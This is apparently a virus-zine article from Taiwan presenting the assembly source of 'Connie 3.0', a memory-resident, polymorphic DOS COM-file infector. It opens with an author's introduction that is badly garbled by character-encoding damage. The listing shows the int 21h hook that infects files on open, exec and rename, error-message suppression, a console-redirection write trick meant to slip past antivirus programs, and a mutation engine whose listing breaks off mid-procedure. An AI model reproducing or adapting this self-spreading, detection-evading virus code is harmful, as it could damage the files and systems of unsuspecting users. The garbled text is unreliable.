
                                                                     P.011

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                Ææ  Connie 3.0 Virus  Ææ                Vo
         pT                                                        OT
         VP                    by  Dark Slayer                     VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


       Connie ¨t¦C¯f¬r±q§Ú°ª¤u®É¥N´N¶}©l¼gªºªF¦è¡A°O±o·í®Éªº Connie 1.0
       ¬O§Úªº²Ä¤@°¦¦h§Î¯f¬r¡A¤]¬O°ê¤º²Ä¤@°¦¦h§Î¯f¬r¡A¤£¹L... ¥H·í®Éªº§Þ
       ³N... «÷«÷´ê´ê¡A¦n¤£®e©ö¤~¼g¥X¨Ó¡A¦p¤µ¬Ý¨Ó¡A·í®É¼gªº Connie 1.0
       ¬OÆZ¥®¸Xªº¡A¨ººØÅÜ§Îµ{«×®Ú¥»¤£»Ý­nªá¤W 1xxx bytes ªºµ{¦¡½X¨Ó¼g¡A
       ¤£¹L·í®É´N¬O¾ÌµÛ¤@ªÑ¼ö±¡¡T¡TÁöµM§Þ³N¤£«ç¼Ë¡A¤]¨S¦³¤H¥i¥H±Ð§Ú¡A§ó
       ¨S¦³¥ô¦ó¸ê®Æ©ÎÅÜÅé¤ÞÀº¥i¥H°Ñ¦Ò¡A¤]¨S¦³¥h¬ã¨s«ü¥O½s½Xªí¡A¦Ó¬O§Q¥Î
       debug ¤@­Ó­Ó«ü¥O¥´¶i¥h¡A¬ã¨s¥X¨ä¤¤ªº³W«h¡A§¹¥þÂÇµÛ¹ï¯f¬rªº¼ö·R¦Ó
       ¦Û¤v¤@­Ó¤H¬ã¨s¥X³\¦hªF¦è¡A¨º¹³§A­Ì²{¦b¸ê°T³o»ò®e©ö¨ú±o... ­ü...
       ¯u¬O©¯ºÖ¦h¤F...

       «á¨Ó¶R¤F¤@¥»¶À¥Ö®Ñ¡A¸Ì­±¦³¤¶²Ð¨ì 80x86 ªº«ü¥O½s½X¡A±q¨ä¤¤¾Ç¨ì¤F¤£
       ¤Ö¡A´N¼g¥X¤F Connie 2.0¡A¦h§Î¯à¤O¤j¦³¶i¨B (¥H²{¦bªº²´¥ú¨Ó¬ÝÁÙ¬O«Ü
       ¥®¸X)¡A·í®É¬Ý¨ì¶À·ç±j¤¶²ÐÅÜÅé¤ÞÀº¡A§ÚÄ±±o«Ü¦³½ì¡A´N§â Connie 2.0
       ¥[¤u¤@¤U¡A©ó¬O... °ê¤º²Ä¤@­ÓÅÜÅé¤ÞÀº DSME 1.0 ¥XÅ¢Åo... «á¨Ó¤S¼g
       ¤F DSCE¡A¤@­Ó§ó±jªº¤ÞÀº (¤£¹L²{¦b¥s§Ú¦A¼g¤@¦¸¡A§Ú¥i¥H¼gªº§ó¤p¡B§ó
       ¦n :)

       ³Ìªñ¡A¦]¬°´»°²ªº«e¤@­Ó¤ë³£¨I·Ä¦b¶§¥ú¡B¨FÅy¡B¬ü¤k¤¤¡Aµ¥´»°²¹L¤F¤@
       ¥b¤§«á²`²`Ä±±o¤£¯à¦AÀZ¼o¤U¥h¤F¡A©Ò¥H§¤¦b¹q¸£«e§â«Ü¤[¥H«e©Ò¼gªº¦h
       §Î¤ÞÀº¦A§ï¤@¤U¡AµM«á¥[¤W«e¤@°}¤l©Ò·Q¥X¨Óªº idea ¡A§Q¥Î¿Ã¹õ¿é¥XÂà
       ¦V¨ìÀÉ®×¡A¨Ó·P¬VÀÉ®×¡A³oºØ¯S®íªº¼gÀÉ¤è¦¡¡A¬Û«H¹ï©ó¤@¯ëªº¨¾¬rµ{¦¡
       ³£¯à¬ð¯}... Oh¡TYeah... :D

       ¦³¤H°Ý§Ú¡AConnie ³o­Ó¦r¤£¬O­^¤å³æ¦r¦Ó­Ë¹³¬O¤k«Ä¤lªº¦W¦r¡A­n§Ú¸Ñ
       ÄÀ¡A­ü... §Ú¤]¤£ª¾¸Ó±q¦ó»¡°_¡A§Ú¥u¯à»¡¬O¦]¬°¬Y­Ó¬G¨Æ¡AÁ¿­Ó¤T¤Ñ¤T
       ©]¤]»¡¤£§¹¡A¬Æ¦Ü¥i¥H©ç¦¨¹q¼v...

       ¤]³\¨C­Ó¤Hªº­Ó©Ê¤£¦P§a¡T(¼o¸Ü!) ¦³¨Ç¤H§Æ±æ¦w¦wÃ­Ã­¡B¥­¥­ÀRÀR¹L¤@
       ½ú¤l¡A¦³¨Ç¤H§Æ±æ¹LµÛ«Ò¤ý¯ëªº¥Í¬¡¡A¦ý¬O§Ú¥u§Æ±æ¬¡ªº¦³²z·Q¡B¦³¥Ø¼Ð
       ¡A¼g¬r¬O§Úªº¿³½ì¡A½Ö³£¤£¯àªý¤î§Ú¡A§Ú¥u§Æ±æ¶XµÛ§ÚÁÙ¦~»´¡BÁÙ¬O­Ó¾Ç
       ¥Í¡BÁÙ¦³³\¦h®É¶¡ªº®É­Ô¡A§V¤Oªºª±³o¨Ç¥L­Ì©Ò¿×ªº¤£°È¥¿·~¡B®Çªù¨«¹D
       ªºµ{¦¡¡A¥u¬O... ¥L­Ì¤£ª¾¹D¥@¬É¤W¦³³\¦hµo©ú´N¬O¦b¶Ãª±ªº¹Lµ{¤¤¡A¤£
       ¿í´`­ì¨Óªº¶Ç²Î³W¯x©Ò²£¥Íªº¡A­Y¬O¤j®a³£¨Ä¨Äªº¨Ì·Ó¼Ð·Çµ{¦¡ªº¼gªk¡A
       ¦Ó¨S¦³¨º¨Ç Undocumented xxxxx ªº¸Ü¡A¨º±N¬O¦h»ò¦aµL½ì°Ú¡T

       Á¿¤F¨º»ò¦h¡A¦n¹³¶V¨Ó¶VÂ÷ÃD¤F¡AOk¡T©³¤U´N¬O³o­Ó Connie 3.0 ªº­ì©l
       µ{¦¡¡A¯f¬rÅéªº³¡¥÷¦³ª`¸Ñ¡A¦Ó¦h§Î¤ÞÀºªº³¡¥÷´N¨S¦³¤F¡A¦]¬°§Ú§Ö¬Ý¤£
       À´§Ú¦b¼g¤°»ò¤F¡A¨ä¤¤¦³¨Ç­^¤åµù¸Ñ¥i¯à¦³¿ù¦r¡A¬Ý¨ì«á... ´N½Ð§A¬ÙÂI
       ¤O®ð¡A¤£¦A­w¦b¦a¤W¯º¤F ^_^

       ¦A¦¸±j½Õ¡A¦¹¬r¾¨¨Ñ¬ã¨s¡A½Ð¤Å´²¼·... ok?

;=========================== CONNIE3.ASM ====================================

mem_size        equ     (offset mem_end-offset start)
mem_para        equ     (mem_size+0fh)/10h
vir_size        equ     (offset vir_end-offset start)

                .model  tiny
                .code
                org     0
start:          mov     bp,sp           ; ¤@¶}©l¬O¬°¤F­n Anti-Trace ©Ò¥Hµ{¦¡
                cli                     ; ¼gªº¦³¨Ç¶Ã, ¬G·Nªº :)
                xor     di,di
                int     11h             ; §Q¥Î int 11h ¨ú¥N call $+2 ¨Ó­«©w¦ì
delta:          mov     ah,52h
                db      2eh
                pushf
                cld
                mov     si,ss:[bp+di-6] ; ¨ú±o­«©w¦ì°¾²¾
                int     21h             ; int 21h/ah=52h, ¨ú dos ¤º³¡ÅÜ¼Æ¦ì§}
                mov     ah,26h
                mov     dx,ds:[di+2]
                mov     ds,es:[bx+di-2]
                cmp     word ptr ds:[di+6],bx
                push    si
                je      run_host
                sub     dh,5
                mov     word ptr ds:[di+6],bx
                int     21h             ; ¦b°O¾ÐÅé³Ì³»ºÝ-500h ¤§³B°µ¤@­Ó psp
                ; ¥Øªº¬O¦bÂÐ»\ command.com ªº«D±`¾n³¡¥÷, ¦p¦¹¤@¨Ó, ·íµ{¦¡µ²
                ; §ô«á, dos ´N·|¶}±Ò command.com Åª¥X«D±`¾nªº³¡¥÷, ·í¶}ÀÉ®É
                ; command.com ´N³Q·P¬V¤F
search_mcb:     cmp     byte ptr ds:mcb_sign[di],4dh
                je      next_mcb
                cmp     byte ptr ds:mcb_sign[di],5ah
                jne     last_mcb
next_mcb:       stc
                mov     bx,ds   ; bx «O¦s¥Ø«e³o¶ô MCB ªº¦ì§}
                mov     ax,bx
                adc     ax,ds:mcb_para_size[di] ; ­pºâ¤U¤@¶ô MCB ªº¦ì§}
                mov     ds,ax
                jmp     search_mcb
last_mcb:       mov     ds,bx   ; ds = bx = ³Ì«á¤@¶ô MCB ªº¦ì§}
                cmp     ds:mcb_onwer_seg[di],di ; ¦¹ MCB ¬O§_¬° free??
                jne     run_host                ; ¤£¬O«hÂ÷¶}
                mov     ax,ds:mcb_para_size[di]
                sub     ax,mem_para             ; ±N MCB ÁY¤ô
                cmc
                jnb     run_host                ; MCB ¤£°÷¤j?
                adc     bx,ax
                lea     si,[si-(offset delta-offset start)]
                mov     cx,vir_size
                mov     es,bx
                mov     ds:mcb_para_size[di],ax
                rep     movs byte ptr es:[di],cs:[si]   ; ·h®aÅo
                mov     ax,offset vir_int21             ; Äd int 21h
                mov     ds,cx
                xchg    ax,ds:[21h*4]
                stosw
                mov     ax,es
                xchg    ax,ds:[21h*4+2]
                stosw
run_host:       pop     si
                push    cs
                mov     di,100h
                pop     es
                pop     ax
                add     si,offset host_code-offset delta
                push    cs
                shr     ah,1
                pop     ds
                push    di
                jc      msg
                movsb                           ; «ì´_­ìµ{¦¡«e 3 bytes ªº¤º®e
                movsw
                ret                             ; °õ¦æ­ìµ{¦¡

msg:            db      'hello! long time no see, this is Connie 3.0 by Dark '
                db      'Slayer of [TPVO], Keelung, Taiwan.'

jmp_code        db      0e9h,?,?
host_code       db      0cdh,20h,?
include         poly

pushall:        pop     cs:ret_ofs
                pushf
                push    ax bx cx dx bp si di ds es
                jmp     word ptr cs:ret_ofs

popall:         pop     cs:ret_ofs
                pop     es ds di si bp dx cx bx ax
                popf
                jmp     word ptr cs:ret_ofs

dos21:          pushf
                cli
                push    cs
                call    int21_exit
                ret

seek_to_head:   mov     al,0
                cmp     ax,0
                org     $-2
seek_to_end:    mov     al,2
                xor     dx,dx
                cmp     ax,0
                org     $-2
seek_from_head: mov     al,0
                mov     ah,42h
                xor     cx,cx
                call    dos21
                ret

write:          call    pushall
                mov     ax,1220h
                int     2fh                     ; ¨ú±o¥Ø«eÀÉ®×¥N½Xªº JFT ¦ì§}
                push    es:[di]                 ; «O¦s¦¹ JFT
                mov     ax,1220h
                xor     bx,bx
                int     2fh                     ; ¨ú±o CON ªº JFT ¦ì§}
                pop     ax                      ; ¨ú¥XÀÉ®×ªº JFT
                mov     ah,al
                xchg    ax,es:[di]              ; ¨Ï CON ªº JFT = ÀÉ®× JFT
                                        ; CON ªº¿é¥X¤J = ÀÉ®× (¿Ã¹õ©MÀÉ®×Âà¦V)
                push    ax
                mov     si,dx
write_loop:     lodsb
                cmp     al,0ffh
                xchg    dx,ax
                mov     ah,6                    ; ¨Ï¥Î int 21h/ah=6 ¨Ó¿é¥X¦r¤¸
                                                ; ¦]¬°¥¦¤£·|°µ¥ô¦ó±±¨î½Xªº³B²z
                jne     not_ff
                mov     ah,2            ; ¥u¦³·í­n¿é¥X 0ffh ®É¤~¥Î int 21h/ah=2
                                        ; ¦]¬° int 21h/ah=6 ¦b dl=0ffh ¬°¿é¤J
                                        ; ¥\¯à
not_ff:         call    dos21
                loop    write_loop
                pop     es:[di]
                call    popall
                ret

infect:         ; ds:dx=file name
                cld
                mov     si,dx
search_zero:    lodsb
                or      al,al
                jnz     search_zero
                mov     ax,ds:[si-5]
                or      ax,2020h
                cmp     ax,'c.' or 2020h        ; ¤ñ¸û¬O§_¬° .com ÀÉ?
                jne     not_com
                mov     ax,ds:[si-5+2]
                or      ax,2020h
                cmp     ax,'mo'
                je      its_com                 ; ¬O«h·P¬V, §_«hªð¦^
not_com:        ret
its_com:        mov     ax,3524h
                call    dos21                   ; ¨ú int 24h ¦ì§}
                ; ±N int 24h ¤@¶}©lªºµ{¦¡½X§ï¬° mov al,3/iret, §í¨î¿ù»~°T®§
                mov     ax,3b0h                 ; 3b0h = mov al,3
                xchg    ax,es:[bx]
                push    ax
                mov     al,0cfh                 ; 0cfh = iret
                xchg    ax,es:[bx+2]
                push    ax
                push    bx es
                mov     ax,4300h
                call    dos21                   ; ¨ú±oÀÉ®×ÄÝ©Ê
                jc      restore_int24_
                mov     bp,cx
                mov     ax,4301h
                xor     cx,cx
                call    dos21                   ; ²M°£ÀÉ®×ÄÝ©Ê
                jnc     clean_attr_ok
restore_int24_: jmp     restore_int24
clean_attr_ok:  push    bp
                mov     ax,3d02h
                call    dos21                   ; ¶}ÀÉ
                jnc     open_ok
                jmp     unattr
open_ok:        xchg    bx,ax
                push    cs cs
                pop     ds es
                mov     ah,3fh
                mov     cx,3
                mov     dx,offset host_code
                call    dos21                   ; Åª¨ú«e 3 bytes
                jc      close_cf
                mov     ax,word ptr ds:host_code
                dec     ax
                cmp     ax,'MZ'-1               ; ÀÉ¦W¬° .com ªº exe ÀÉ??
                je      close                   ; ¬O«h¤£·P¬V
                cmp     ax,'ZM'-1
                je      close
                call    seek_to_end             ; ²¾°ÊÅª¼g«ü¼Ð¦ÜÀÉ§À
                                                ; ¨ú±oÀÉ®×±`«×
                or      dx,dx
                jnz     close                   ; ¤j©ó 64k «h¤£·P¬V
                cmp     ax,2000h
close_cf:       jbe     close           ; ¤p©ó©Îµ¥©ó 8192 bytes ¤]¤£·P¬V
                cmp     ax,0ffffh-(vir_size+200h+200h)
                ja      close                   ; ¤p©ó 64k ¦ýÁÙ¬O¤Ó¤jªº, ¤£·P¬V
                test    ax,1ffh         ; ÀÉ®×ªø«×¬° 512 (200h) ªº­¿¼Æ??
                jz      close   ; ­Y¬O«h¤£·P¬V (¦¹¬°¯f¬r·P¬V«áªº¯S¼x, mark)
                sub     ax,3
                mov     word ptr ds:jmp_code[1],ax      ; ­pºâ jmp ªº disp
                add     ax,103h
                xchg    bp,ax
                call    seek_to_head            ; ²¾Åª¼g«ü¼Ð¦ÜÀÉÀY
                mov     ax,5700h
                call    dos21                   ; ¨úÀÉ®×¤é´Á
                push    cx dx                   ; ¨Ã«O¦s
                mov     cx,3
                mov     dx,offset jmp_code
                call    write                   ; ¼g jmp xxxx ¦ÜÀÉ®×¶}ÀY
                call    seek_to_end             ; ²¾Åª¼g«ü¼Ð¦ÜÀÉ§À
                xor     si,si                   ; ³]©w¦h§Î¤ÞÀºªº°Ñ¼Æ
                mov     di,offset encrypt_buffer
                mov     al,20h
                call    rnd_limitb
                add     ax,vir_size
                xchg    cx,ax
                mov     al,10
                call    rnd_limitb
                inc     ax
                xchg    dx,ax
                call    rnd
                call    poly                    ; call ¦h§Î¤ÞÀº
                call    write                   ; ¼g¤J¯f¬rÅé
                call    seek_to_end
                add     ax,1ffh
                and     ax,not 1ffh             ; ¨ÏÀÉ®×¤j¤p¦¨¬° 512 ªº­¿¼Æ
                dec     ax
                xchg    dx,ax
                call    seek_from_head
                mov     cx,1
                call    write
                pop     dx cx
                mov     ax,5701h
                call    dos21                   ; «ì´_ÀÉ®×¤é´Á
close:          mov     ah,3eh
                call    dos21                   ; ÃöÀÉ
unattr:         mov     ax,4301h
                pop     cx
                call    dos21                   ; «ì´_ÀÉ®×ÄÝ©Ê
restore_int24:  pop     es bx
                pop     es:[bx+2] es:[bx]       ; «ì´_ int 24h ­ìµ{¦¡½X¤º®e
infect_exit:    ret

vir_int21:      call    pushall
                cmp     ah,3dh                  ; ¶}ÀÉ?
                je      to_infect_it            ; oh... yeah!!! ·P¬V
                cmp     ah,43h                  ; ¨ú/³] ÀÉ®×ÄÝ©Ê?
                je      to_infect_it            ; oh... yeah!!! ·P¬V
                cmp     ah,4bh                  ; °õ¦æÀÉ®×?
                je      to_infect_it            ; oh... yeah!!! ·P¬V
                cmp     ah,56h                  ; rename?
                je      to_infect_it            ; oh... yeah!!! ·P¬V
                cmp     ah,6ch                  ; ¶}ÀÉ?
                jne     done                    ; ³£¤£¬O :( Â÷¶}
                mov     dx,si                   ; 6ch ªº ds:si «ü¦VÀÉ¦W
to_infect_it:   call    infect                  ; ·P¬V¦¹ÀÉ
done:           call    rnd                     ; ­«¸m¶Ã¼Æ
                call    popall
int21_exit:     db      0eah
vir_end:
old21           dw      ?,?
ret_ofs         dw      ?
encrypt_buffer  db      vir_size+300h dup(?)
mem_end:

mcb             struc
mcb_sign        db      ?
mcb_onwer_seg   dw      ?
mcb_para_size   dw      ?
                db      3 dup(?)
mcb_name        db      8 dup(?)
mcb             ends

                end     start

;================================= POLY =====================================

setatc          macro
                db      0d6h
                endm
icebp           macro
                db      0f1h
                endm

addr_mod_table  db      0,0,0,10000111b,0,10000110b,10000100b,10000101b

decryptor_code  db      10h,18h,18h,10h,00h,28h,28h,00h,30h,30h

cmp_count_rr_code  db   0bh,23h,85h
cmp_count_rr_code_count equ $-offset cmp_count_rr_code

cmp_count_r0_code  db   000000b,001000b,101000b,110000b,111000b
cmp_count_r0_code_count equ $-offset cmp_count_r0_code

condition_jmp_code db   72h,75h,76h,78h         ; for no count
condition_jmp_code_count equ $-offset condition_jmp_code

condition_jmp_code_ db  75h,77h,78h,7ch,7eh     ; for count
condition_jmp_code__count equ $-offset condition_jmp_code_

one_byte_code:  nop
                lock
                int     3
;               icebp
                cli
                sti
                cld
                into
                wait
one_byte_dcf_number equ $-offset one_byte_code
                cmc
                clc
                stc
one_byte_number equ     $-offset one_byte_code

one_byte_al_code:
                cbw
                lahf
                xlat
                setatc
one_byte_al_dcf_number equ $-offset one_byte_al_code
                daa
                das
                aaa
                aas
                sahf
one_byte_al_number equ  $-offset one_byte_al_code

poly            proc    ; ds:si = source, es:di = target, cx = length
                        ; dx = max number of code, bp = execute offset
; ax = mode
; input:
;       bit 0 =0 -> cs != ds != ss, =1 -> cs = ds = ss
;       bit 1 =0 -> long decryptor, =1 -> short decryptor
;       bit 2 =0 -> byte, =1 -> word (decrypt size)
;       bit 3 =0 -> forward decryptor, =1 -> backward decryptor

;       bit 4 =0 ->
;       bit 5 =0 -> don't use key register, =1 -> use key register
;       bit 6 =0 -> don't use count register, =1 -> use count register
;       bit 7 =0 -> forward count, =1 -> backward count

;       bit 8 =0 -> normal condition jmp, =1 -> negitive condition jmp

; program self control
;       bit 11=0 -> not sure value of flags, 1 -> it's sure

;       bit 12=0 -> don't use, =1 use add sub count & jnz
;       bit 13=0 -> don't use jcxz, =1 -> use jcxz
;       bit 14=0 -> don't use loop, =1 -> use loop
;       bit 15=0 -> can change flag, =1 -> don't change

                push    bx
                cld
                and     ah,00000111b
                push    ax
                inc     cx
                and     cl,0feh
                mov     ds:source_length,cx
                mov     ax,es
                add     di,0fh
                mov     cl,4
                shr     di,cl
                add     ax,di
                mov     di,bp
                shr     bp,cl
                sub     ax,bp
                mov     es,ax
                lea     ax,[di+130h]
                mov     ds:jmp_ofs,ax
                mov     ds:work_addr,di
                mov     ds:work_addr[2],es
                mov     ds:max_number,dx
                pop     bp
                push    si
                mov     dx,1110111100000000b
                mov     ds:count_reg,dh

                mov     ax,offset make_addr_reg
                mov     bx,offset make_count_reg
                mov     si,offset order_ret
                call    rnd_order

                mov     ds:loop_offset,di

                mov     ax,offset make_decryptor
                mov     bx,offset make_inc_addr_reg
                mov     si,offset make_inc_count_reg
                call    rnd_order

                call    cmp_loop_condition
                call    condition_jmp
                call    make_
                mov     ax,0
                org     $-2
jmp_ofs         dw      ?
                call    jmp_ax
                mov     cx,0
                org     $-2
source_length   dw      ?
                pop     si
                push    di
                rep     movsb
                sub     di,ds:work_addr
                mov     ds:code_length,di
                mov     al,0
                org     $-1
addr_reg        db      ?
                or      al,50h
                mov     ds:push_addr_reg,al
                call    poly_code
                push    cs
                pop     ds
                pop     bx
                push    ax
                neg     ax
                add     ax,bx
                test    bp,1000b
                jz      p_l2
                add     ax,ds:source_length
p_l2:
                mov     bx,0
                org     $-2
decryptor_offset dw     ?
                mov     es:[bx+2],ax
                call    sign
                jnz     p_l4
                call    get_one_garbage
                xor     byte ptr es:[bx+1],11000000b
                test    bp,100000b
                jnz     p_l2_1
                xor     byte ptr ds:decryptor_code_[1],11000000b
p_l2_1:
                call    adjust_bx
                mov     es:[bx+3],al
                jmp     p_l4_ll0
p_l4:
                inc     bx
                inc     bx
                test    bp,100b
                jz      p_l4_ll0
                inc     bx
p_l4_ll0:
                test    bp,100000b
                jnz     p_l4_l0
                call    rnd
                mov     es:[bx+2],al
                mov     cl,80h
                test    bp,100b
                jz      p_l4_l0
                inc     cx
                mov     es:[bx+1],ah
                call    _2_chance
                jnz     p_l4_l0
                call    get_one_garbage
                mov     es:[bx+2],al
                or      cl,2
p_l4_l0:
                mov     bx,ds:decryptor_offset
                mov     es:[bx],cl

                pop     ax
                test    bp,1000000b
                jnz     p_l4_1_1

                mov     bx,ds:source_length
                test    bp,1000b
                jz      p_l4_0
                neg     bx
p_l4_0:
                add     ax,bx
                mov     bx,0
                org     $-2
addr_cmp_offset dw      ?
                call    sign
                jnz     p_l4_1
                push    ax
                call    get_one_garbage
                pop     cx
                xchg    cx,ax
                mov     ah,cl
                or      byte ptr es:[bx-2],2
p_l4_1:
                mov     es:[bx],ax
p_l4_1_1:
                mov     ax,0
                org     $-2
decryptor_code_ dw      ?
                mov     bx,ds:decryptor_offset
                test    bp,100000b
                jz      p_l4_2
                mov     es:[bx],al
                dec     bx
p_l4_2:
                inc     bx
                push    ax
                push    bx
                mov     bx,0
                org     $-2
encrypt_retf    dw      ?
                mov     al,0cbh
                xchg    al,es:[bx]
                push    ax
                push    bx
                call    poly_code
                pop     bx
                pop     ax
                mov     ds:[bx],al
                pop     bx
                pop     ax
                mov     ds:[bx],ah
                pop     bx
                mov     cx,0
                org     $-2
code_length     dw      ?
                mov     dx,cs:work_addr
                ret
poly            endp

poly_code:      push    bp
                push    es
                pop     ds
                db      9ah
work_addr       dw      ?,?
push_addr_reg   db      ?
                pop     ax
                pop     bp
                ret

prefix?         proc
                test    bp,1
                jnz     cp_exit
cs_prefix       proc
                push    ax
                mov     al,2eh
                stosb
                pop     ax
cp_exit:        ret
cs_prefix       endp
prefix?         endp

sign            proc    ; ZF = 1, signed
                test    ax,1111111110000000b
                jz      s_l1
                not     ax
                test    ax,1111111110000000b
                not     ax
s_l1:           ret
sign            endp

adjust_bx       proc
                test    bp,100000b
                jnz     ab_l0
                inc     bx
                test    bp,100b
                jz      ab_l0
                inc     bx
ab_l0:          ret
adjust_bx       endp

; no count and forward decryptor  -> jnz  jb   jbe  js
; no count and bakcward decryptor -> jnz  ja   jae  jns
; forward count decryptor         -> jnz  js   jl   jle  ja
; backward count decryptor        -> jnz  jns  jg   jge  ja


condition_jmp   proc
                call    make_
                test    bp,100000000b
                jnz     cj_l1
                call    get_up_jmp_offset
                mov     ch,al
                call    get_condition_jmp_code
                xchg    cx,ax
                mov     al,cl
                stosw
                jmp     cj_l2
cj_l1:
                push    di
                scasw
                call    make_
                call    get_up_jmp_offset
                mov     ah,al
                mov     al,0ebh
                stosw
                pop     ax
                push    di
                push    ax
                call    make_
                pop     ax
                mov     si,ax
                neg     ax
                add     ax,di
                dec     ax
                dec     ax
                mov     ch,al
                call    get_condition_jmp_code
                xchg    cx,ax
                mov     al,cl
                mov     es:[si],ax
                pop     si
                test    bp,2000h
                jnz     cj_l2
                call    _2_chance
                jnz     cj_l2
                xor     al,1
                mov     es:[si-2],al
cj_l2:
                mov     ds:encrypt_retf,di
                and     bp,not 8000h
                ret
condition_jmp   endp

get_up_jmp_offset proc
                mov     ax,di
                neg     ax
                add     ax,0
                org     $-2
loop_offset     dw      ?
                dec     ax
                dec     ax
                ret
get_up_jmp_offset endp

get_condition_jmp_code proc
                mov     al,0e2h
                test    bp,4000h
                jnz     gcjc_l4
                inc     ax
                test    bp,2000h
                jnz     gcjc_l4
                test    bp,1000000b
                jnz     gcjc_l1
                mov     al,condition_jmp_code_count
                call    rnd_limitb
                mov     bx,offset condition_jmp_code
                xlat
                test    bp,1000b
                jmp     gcjc_l2
gcjc_l1:
                mov     al,condition_jmp_code__count
                call    rnd_limitb
                mov     bx,offset condition_jmp_code_
                xlat
                test    bp,10000000b
gcjc_l2:
                jz      gcjc_l3
                or      al,1
gcjc_l3:
                test    bp,1000h
                jz      gcjc_l3_1
                mov     al,75h
gcjc_l3_1:
                test    bp,100000000b
                jz      gcjc_l4
                xor     al,1
gcjc_l4:
                ret
get_condition_jmp_code endp

make_addr_reg   proc
mar_l1:
                call    make_code
                mov     al,dl
                and     al,11101000b
                jz      mar_l1
                test    bp,100b
                jnz     mar_l2
                test    bp,100000b
                jz      mar_l2
                test    dl,00001111b
                jz      mar_l1
mar_l2:
                call    cob_and_b_num
                cmp     al,0
                org     $-1
count_reg       db      ?
                je      mar_l1
                mov     ds:addr_reg,al
                jmp     unset_chg_flag
make_addr_reg   endp

make_count_reg  proc
                test    bp,1000000b             ; use count reg?
jz_ret:         jz      gcjc_l4
                call    make_
                mov     bx,ds:source_length
                test    bp,100b                 ; byte or word?
                jz      mcr_l1
                shr     bx,1
mcr_l1:         mov     cx,bx
                push    dx
mcr_l1_1:       mov     ax,1
                call    _2_chance
                jnz     mcr_l1_2
                cwd
                neg     ax
                div     bx
                call    rnd_limit
                jz      mcr_l1_1
mcr_l1_2:       mov     ds:count_inc_value,ax
                mul     bx
                xchg    bx,ax
                pop     dx
                call    chose_chg
                call    unset_chg_flag
                mov     ds:count_reg,al
                test    bp,10000000b            ; forward or backward count?
                jnz     mcr_l2
                neg     bx
                jmp     mcr_l2_2
mcr_l2:         call    _5_chance
                jz      mcr_l2_2
                cmp     al,1                    ; cx is count?
                jne     mcr_l2_2
                mov     bx,cx
                mov     word ptr ds:count_inc_value,1
                test    bp,100000000b           ; normal or negative condition?
                jnz     mcr_l2_1
                or      bp,4000h                ; use loop
                jmp     mcr_l2_2
mcr_l2_1:       or      bp,2000h                ; use jcxz
mcr_l2_2:       push    ax
                call    set_reg_to_bx
                pop     ax
                jmp     set_set_flag
make_count_reg  endp

make_inc_count_reg proc
                test    bp,1000000b
                jz      jz_ret
                test    bp,4000h
                jnz     jnz_ret
                call    make_
                mov     al,ds:count_reg
                mov     cx,0
                org     $-2
count_inc_value dw      ?
                test    bp,10000000b
                jz      micr_l1
                neg     cx
micr_l1:
                jmp     inc_dec_reg
make_inc_count_reg endp

cmp_loop_condition proc
                test    bp,4000h+2000h
jnz_ret:        jnz     cc_l1
                or      bp,8000h
                test    bp,1000000b
                jz      cc_l2
                call    _2_chance
                jnz     cc_l0
                or      bp,1000h
                xor     ax,ax
                call    _2_chance
                jnz     clc_l0
                call    rnd
                call    _2_chance
                jnz     clc_l0
                cbw
clc_l0:         xchg    cx,ax
                mov     al,ds:count_reg
                jcxz    clc_l1
                call    inc_dec_reg
                neg     cx
clc_l1:         jmp     inc_dec_reg

cc_l0:          call    make_
                call    _2_chance
                jnz     cmp_r0
                mov     al,cmp_count_rr_code_count
                call    rnd_limitb
                mov     bx,offset cmp_count_rr_code
                xlat
                stosb
                mov     al,ds:count_reg
                mov     ah,al
                mov     cl,3
                shl     al,cl
                or      al,0c0h
                or      al,ah
                stosb
cc_l1:
                ret
cmp_r0:
                mov     al,cmp_count_r0_code_count
                call    rnd_limitb
                mov     bx,offset cmp_count_r0_code
                xlat
                mov     ah,al
                mov     al,83h
                mov     bl,ds:count_reg
                xor     cx,cx
                jmp     rn_code_

cc_l2:
                call    make_
                mov     al,ds:addr_reg
                or      al,0f8h
                mov     ah,al
                mov     al,81h
                stosw
                mov     ds:addr_cmp_offset,di
                scasw
                ret
cmp_loop_condition endp

set_reg_to_bx   proc    ; al=reg number, bx=value
                call    _5_chance
                jz      srtb_l1
                test    al,100b
                jnz     srtb_l0
                call    _5_chance
                jnz     srtb_l0

                mov     cx,0b4b0h
                call    _2_chance
                jnz     srtb_lf1
                xchg    bl,bh
                xchg    cl,ch
srtb_lf1:
                push    ax bx cx
                or      al,cl
                stosb
                mov     al,bl
                stosb
                call    make_3
                pop     cx bx ax
                or      al,ch
                stosb
                mov     al,bh
                stosb
                ret
srtb_l0:
                or      al,0b8h
                jmp     srtb_l2
srtb_l1:
                push    ax
                mov     al,8dh
                stosb
                mov     cl,3
                pop     ax
                shl     al,cl
                or      al,6
srtb_l2:
                stosb
                xchg    bx,ax
                stosw
                ret
set_reg_to_bx   endp

make_decryptor  proc
                call    make_

                mov     al,5
                call    rnd_limitb
                cmp     al,1
                ja      p_l5
                test    bp,800h
                jnz     p_l5
                add     al,3
p_l5:
                shl     al,1
                xchg    si,ax
                add     si,offset decryptor_code
                lodsw
                test    bp,100b
                jz      p_l6
                test    bp,100000b
                jz      p_l6
                add     ax,101h
p_l6:
                push    ax

                and     bp,not 800h

                test    bp,1
                jz      md_ll0
                cmp     byte ptr ds:addr_reg,5
                jne     md_l0
md_ll0:
                call    cs_prefix
md_l0:
                mov     ds:decryptor_offset,di
                mov     al,0cbh
                stosb
                mov     al,ds:addr_reg
                mov     bx,offset addr_mod_table
                xlat
                mov     ah,al
                pop     bx
                test    bp,100000b
                jnz     md_l0_1
                or      ax,bx
                mov     ds:decryptor_code_,ax
                jmp     md_l3
md_l0_1:
                mov     ds:decryptor_code_,bx

                push    dx
                test    bp,100b
                pushf
                jnz     md_l1
                and     dl,00001111b
md_l1:
                call    chose_set
                popf
                jnz     md_l2
                call    _2_chance
                jnz     md_l2
                or      al,100b
md_l2:
                pop     dx
                mov     cl,3
                shl     al,cl
                or      al,ah
md_l3:
                stosb
                scasw
                test    bp,100000b
                jnz     md_l4
                scasw
                test    bp,100b
                jnz     md_l4
                dec     di
md_l4:
                ret
make_decryptor  endp

make_inc_addr_reg proc
